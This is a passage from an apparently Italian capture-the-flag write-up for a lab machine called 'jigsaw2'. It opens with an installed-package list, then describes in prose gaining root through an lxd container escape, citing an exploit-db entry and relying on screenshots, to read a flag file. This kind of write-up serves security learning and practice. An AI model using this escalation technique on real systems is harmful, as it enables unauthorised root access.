python3-pam/bionic,now 0.4.2-13.2ubuntu4 amd64 [installed]
python3-pkg-resources/bionic,now 39.0.1-2 all [installed]
python3-problem-report/bionic-updates,bionic-security,now 2.20.9-0ubuntu7.7 all [installed]
python3-pyasn1/bionic,now 0.4.2-3 all [installed]
python3-pyasn1-modules/bionic,now 0.2.1-0.2 all [installed]
python3-pyinotify/bionic,now 0.9.6-1 all [installed,automatic]
python3-requests/bionic-updates,bionic-security,now 2.18.4-2ubuntu0.1 all [installed]
python3-requests-unixsocket/bionic,now 0.1.5-3 all [installed]
python3-serial/bionic,now 3.4-2 all [installed]
python3-service-identity/bionic,now 16.0.0-2 all [installed]
python3-six/bionic,now 1.11.0-2 all [installed]
python3-software-properties/now 0.96.24.32.7 all [installed,upgradable to: 0.96.24.32.11]
python3-systemd/bionic,now 234-1build1 amd64 [installed]
python3-twisted/bionic,now 17.9.0-2 all [installed]
python3-twisted-bin/bionic,now 17.9.0-2 amd64 [installed]
python3-update-manager/now 1:18.04.11.9 all [installed,upgradable to: 1:18.04.11.10]
python3-urllib3/bionic-updates,bionic-security,now 1.22-1ubuntu0.18.04.1 all [installed]
python3-yaml/bionic,now 3.12-1build2 amd64 [installed]
python3-zope.interface/bionic,now 4.3.2-1build2 amd64 [installed]
python3.6/bionic-updates,bionic-security,now 3.6.8-1~18.04.2 amd64 [installed]
python3.6-minimal/bionic-updates,bionic-security,now 3.6.8-1~18.04.2 amd64 [installed]
readline-common/bionic,now 7.0-3 all [installed]
rpcbind/bionic,now 0.2.3-0.6 amd64 [installed,automatic]
rsync/bionic,now 3.1.2-2.1ubuntu1 amd64 [installed]
rsyslog/bionic,now 8.32.0-1ubuntu4 amd64 [installed]
run-one/bionic,now 1.17-0ubuntu1 all [installed]
screen/bionic-updates,now 4.6.2-1ubuntu1 amd64 [installed]
sed/bionic,now 4.4-2 amd64 [installed]
sensible-utils/bionic,now 0.0.12 all [installed]
shared-mime-info/bionic,now 1.9-2 amd64 [installed]
snapd/bionic-security,now 2.37.4+18.04.1 amd64 [installed,upgradable to: 2.40+18.04]
software-properties-common/now 0.96.24.32.7 all [installed,upgradable to: 0.96.24.32.11]
sosreport/now 3.6-1ubuntu0.18.04.2 amd64 [installed,upgradable to: 3.6-1ubuntu0.18.04.3]
squashfs-tools/bionic-updates,now 1:4.3-6ubuntu0.18.04.1 amd64 [installed]
ssh-import-id/bionic-updates,now 5.7-0ubuntu1.1 all [installed,automatic]
ssl-cert/bionic,now 1.0.39 all [installed,automatic]
steghide/bionic,now 0.5.1-12 amd64 [installed]
strace/bionic,now 4.21-1ubuntu1 amd64 [installed]
sudo/bionic,now 1.8.21p2-3ubuntu1 amd64 [installed]
systemd/bionic-updates,bionic-security,now 237-3ubuntu10.29 amd64 [installed]
systemd-sysv/bionic-updates,bionic-security,now 237-3ubuntu10.29 amd64 [installed]
sysvinit-utils/bionic,now 2.88dsf-59.10ubuntu1 amd64 [installed]
tar/bionic-updates,now 1.29b-2ubuntu0.1 amd64 [installed]
tcpdump/bionic,now 4.9.2-3 amd64 [installed]
telnet/bionic,now 0.17-41 amd64 [installed]
thermald/now 1.7.0-5ubuntu2 amd64 [installed,upgradable to: 1.7.0-5ubuntu5]
time/bionic,now 1.7-25.1build1 amd64 [installed]
tmux/now 2.6-3ubuntu0.1 amd64 [installed,upgradable to: 2.6-3ubuntu0.2]
tzdata/bionic-updates,bionic-security,now 2019c-0ubuntu0.18.04 all [installed]
ubuntu-advantage-tools/bionic,now 17 all [installed]
ubuntu-keyring/bionic-updates,now 2018.09.18.1~18.04.0 all [installed]
ubuntu-minimal/bionic,now 1.417 amd64 [installed,upgradable to: 1.417.3]
ubuntu-release-upgrader-core/now 1:18.04.30 all [installed,upgradable to: 1:18.04.34]
ubuntu-server/bionic,now 1.417 amd64 [installed,upgradable to: 1.417.3]
ubuntu-standard/bionic,now 1.417 amd64 [installed,upgradable to: 1.417.3]
ucf/bionic,now 3.0038 all [installed]
udev/bionic-updates,bionic-security,now 237-3ubuntu10.29 amd64 [installed]
ufw/bionic,now 0.35-5 all [installed,upgradable to: 0.36-0ubuntu0.18.04.1]
uidmap/bionic,now 1:4.5-1ubuntu1 amd64 [installed,upgradable to: 1:4.5-1ubuntu2]
unattended-upgrades/now 1.1ubuntu1.18.04.8 all [installed,upgradable to: 1.1ubuntu1.18.04.11]
unzip/bionic,now 6.0-21ubuntu1 amd64 [installed]
update-manager-core/now 1:18.04.11.9 all [installed,upgradable to: 1:18.04.11.10]
update-notifier-common/now 3.192.1.5 all [installed,upgradable to: 3.192.1.7]
ureadahead/bionic,now 0.100.0-20 amd64 [installed,upgradable to: 0.100.0-21]
usbutils/bionic,now 1:007-4build1 amd64 [installed]
util-linux/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
uuid-runtime/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
vim/bionic-updates,bionic-security,now 2:8.0.1453-1ubuntu1.1 amd64 [installed]
vim-common/bionic-updates,bionic-security,now 2:8.0.1453-1ubuntu1.1 all [installed]
vim-runtime/bionic-updates,bionic-security,now 2:8.0.1453-1ubuntu1.1 all [installed]
vim-tiny/bionic-updates,bionic-security,now 2:8.0.1453-1ubuntu1.1 amd64 [installed]
wget/bionic-updates,bionic-security,now 1.19.4-1ubuntu2.2 amd64 [installed]
whiptail/bionic,now 0.52.20-1ubuntu1 amd64 [installed]
whois/bionic,now 5.3.0 amd64 [installed,automatic]
wireless-regdb/bionic-updates,now 2018.05.09-0ubuntu1~18.04.1 all [installed,automatic]
xauth/bionic,now 1:1.0.10-1 amd64 [installed]
xdelta3/bionic,now 3.0.11-dfsg-1ubuntu1 amd64 [installed]
xdg-user-dirs/bionic,now 0.17-1ubuntu1 amd64 [installed]
xfsprogs/bionic,now 4.9.0+nmu1ubuntu2 amd64 [installed]
xkb-data/bionic,now 2.23.1-1ubuntu1 all [installed,upgradable to: 2.23.1-1ubuntu1.18.04.1]
xxd/bionic-updates,bionic-security,now 2:8.0.1453-1ubuntu1.1 amd64 [installed]
xz-utils/bionic,now 5.2.2-1.3 amd64 [installed]
zerofree/bionic,now 1.0.4-1 amd64 [installed]
zlib1g/bionic,now 1:1.2.11.dfsg-0ubuntu2 amd64 [installed]
jigsaw@jigsaw2:~$ apt list --installed | wc -l

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

587
jigsaw@jigsaw2:~$
```

Da una veloce ricerca troviamo le seguenti possibilita'.
Possibili strade per la privilege escalation :



apache2/bionic-updates,bionic-security,now 2.4.29-1ubuntu4.11 amd64 [installed]
lxd/bionic-updates,now 3.0.3-0ubuntu1~18.04.1 amd64 [installed]
snapd/bionic-security,now 2.37.4+18.04.1 amd64 [installed,upgradable to: 2.40+18.04]    <<< non vulnerabile


Proviamo con snapd :

![Schermata da 2019-10-05 08-52-14](https://user-images.githubusercontent.com/54471416/66257302-5aa53380-e765-11e9-9923-30adc0ce92f7.png)

Niente da fare.
Proviamo adesso con lxd .
Come da prerequisiti listati qui  https://www.exploit-db.com/exploits/46978
Scarichiamo e facciamo la build di alpine, poi esponiamo l'output risultante dalla macchina attaccante :

![Schermata da 2019-10-05 10-31-33](https://user-images.githubusercontent.com/54471416/66257307-609b1480-e765-11e9-99a9-b5be0bda72c1.png)

La scarichiamo sult target e eseguiamo lo script per l'esecuzione del container.
Una volta aperta la bash con privilegi di roor, su /mnt/root/root/gameover.txt troveremo la flag2! 

![Schermata da 2019-10-05 10-35-25](https://user-images.githubusercontent.com/54471416/66257315-73154e00-e765-11e9-9103-1378f0eaac03.png)


![flag2jigsaw](https://user-images.githubusercontent.com/54471416/66258418-58fb6000-e7a5-11e9-9380-166da10b2833.PNG)

Presa!

Walter Messina - phan2sec@gmail.com
Freecircle Security Team

